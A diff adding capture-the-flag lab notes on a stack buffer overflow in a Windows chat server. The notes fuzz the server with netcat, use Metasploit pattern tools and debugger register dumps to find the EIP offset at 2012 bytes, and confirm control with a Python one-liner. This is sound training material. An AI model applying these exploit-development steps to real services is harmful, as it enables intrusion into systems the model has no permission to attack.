@@ -165,32 +165,101 @@ PASS anonymous
 quit
 ```   
 
+Initial Test of chatserver
+- Test name limit with 30 characters and message area with long string of A's
+
 Server Side (Windows 8 – chatserver.exe)
+- Server only seemed to accept 24 of the 30 characters sent as name
+- Server failed as soon as i went to 2500 A's, was ok with 1000 A's. 
 ```
 C:\Users\Administrator\Desktop\binary\chatserver.exe
 
 Chat Server started!
 Called essential function dll version 1.00
 
-Waiting for connections..
-Received a client connection from <netcat_terminal_IP>:52332
-Client <netcat_terminal_IP>:52332 selected username: THM_USER
+Waiting for connections.
+Received a client connection from 192.168.0.167:52332
+Client 192.168.0.167:52332 selected username: THM_USER
+Client 192.168.0.167:52332 closed connection.
+Received a client connection from 192.168.0.167:52326
+Client 192.168.0.167:52326 selected username: AAAAAAAAAAAAAAAAAAAAAAAA
 ```
 Client Side (Netcat Terminal – Linux)
 ```
-(hacktopuser@hacktop) ~/Desktop
-$ nc <chatserver-IP> 9999
-
+┌──(hacktopuser㉿hacktop)-[~/Desktop]
+└─$ nc 192.168.0.199 9999
 Welcome to Brainstorm chat (beta)
-Please enter your username (max 20 characters): THM_USER
-Write a message: TEST INPUT TEXT
+Please enter your username (max 20 characters): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Write a message: AAAAAAAAAAAAAAAAAAAAAAAAA...1000 sent no problem
 
-Fri May 29 02:46:35 2026
-THM_USER said: TEST INPUT TEXT
-
-Write a message: TEST2 TEXT
-
-Fri May 29 02:47:01 2026
-THM_USER said: TEST2 TEXT
+Fri May 29 03:44:59 2026
+AAAAAAAAAAAAAAAAAAAA said: AAAAAAAAAAAAAAAAAAAAAAAAA...1000 sent no problem
 ```
+When 2500 sent automatically crashed no reply
+```
+Write a message:  AAAAAAAAAAAAAA...total of 2000 sent and server crashed here about like in first send.
+```
+There is a better way to find the EIP
+
+Metasploit pattern tools found in kali installation can help here:
+located in: /usr/share/metasploit-framework/tools/exploit/
+
+Tool	              Purpose
+pattern_create.rb	  Generates the unique cyclic pattern
+pattern_offset.rb	  Finds the exact EIP offset after a crash
+
+Generate a pattern for easier detection of a point using what shows up in EIP to determine the number of bytes required to overflow into the EIP section.
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+This is same as 'msf-pattern_create -l 3000'
+
+Then sent the output from pattern_create.rb to chatserver as message naturally the server crashed. We however populated the EIP with unique characters we can determine location using the pattern_offset.rb file. 
+
+First here is a the immunity debugger Registers section:
+- Note EAX where message starts 
+- EBX is directly after EIP.
+- EIP is 31704330 representing 4 characters:
+      0x31 = '1'
+      0x70 = 'p'
+      0x43 = 'C'
+      0x30 = '0'
+- Its actually backwards 0Cp1 appears in the message sent.
+
+Bytes required to overflow buffer into EIP can be calculated using:
+  ```
+  msf-pattern_offset -q 31704330
+  ```
+It shows that EIP is 2012 bytes location. This was tested dropping in 2012 bytes of A and 4 of B to fill the EIP value.
+
+### Here is the Registers after the dropping the 3000 long character string in message:
+```
+Registers (FPU)
+
+EAX 0045E5DC ASCII "Aa0aA1aA2aA3aA4aA5aA6aA7aA8aA"
+ECX 000520F0
+EDX 000000C2
+EBX 0040199E ASCII "Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cp0aCq"
+ESP 0012FF48
+EBP 0040199E
+ESI chatserv.0040199E
+EDI chatserv.0040199E
+
+EIP 31704330
+...
+```
+
+This is what was used to generate the 3000 characters, resolve EIP location and payload to test it.
+```                                         
+...-[~/Desktop]
+└─$ msf-pattern_create -l 3000                                                                  Aa0Aa1Aa2Aa3Aa4Aa5Aa......further in 2012->0Cp1.......0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9
+                                                                                                ...-[~/Desktop]
+└─$ msf-pattern_offset -q 31704330
+[*] Exact match at offset 2012
+                                            
+┌──(hacktopuser㉿hacktop)-[~/Desktop]
+└─$ python3 -c "print('A'*2012+'B'*4)"     
+AAAAAAAAAA......AAAABBBB
+```                                                                                                                                                      
+
+
 
